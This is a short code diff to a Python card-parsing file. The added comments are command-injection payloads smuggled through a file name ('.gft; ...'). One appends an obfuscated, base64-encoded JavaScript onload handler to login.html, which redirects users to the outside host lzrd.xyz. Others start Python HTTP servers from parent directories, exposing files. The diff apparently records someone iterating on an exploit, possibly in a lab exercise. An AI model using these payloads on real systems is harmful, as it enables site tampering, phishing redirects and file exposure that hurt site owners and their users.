@@ -72,7 +72,16 @@ def parse_card_data(card_file_data, card_path_name):
 
 # .gft; cd ..; cd ..; cd ..; cd ..; cd ..; cd ..; python2 -m SimpleHTTPServer 8001; echo "success";
 
+# .gft; cd templates ; echo "<img onload='eval(atob(\"d2luZG93LmxvY2F0aW9uPSJodHRwczovL2x6cmQueHl6Ig==\"))'>" >> login.html;
 
+# SLASHES! DO! NOT! WORK!
+# .gft; cd templates ; echo "<img onload='window.location='//lzrd.xyz''>" >> login.html;
+
+# .gft; python2 -m SimpleHTTPServer 8001; echo "success";
+
+# .gft; python3 -m http.server 8001; echo "success";
+
+# .gft; python3 -m http.server 8001 &; echo "success";
 
 
 # .gft; gedit potato.txt; echo ""
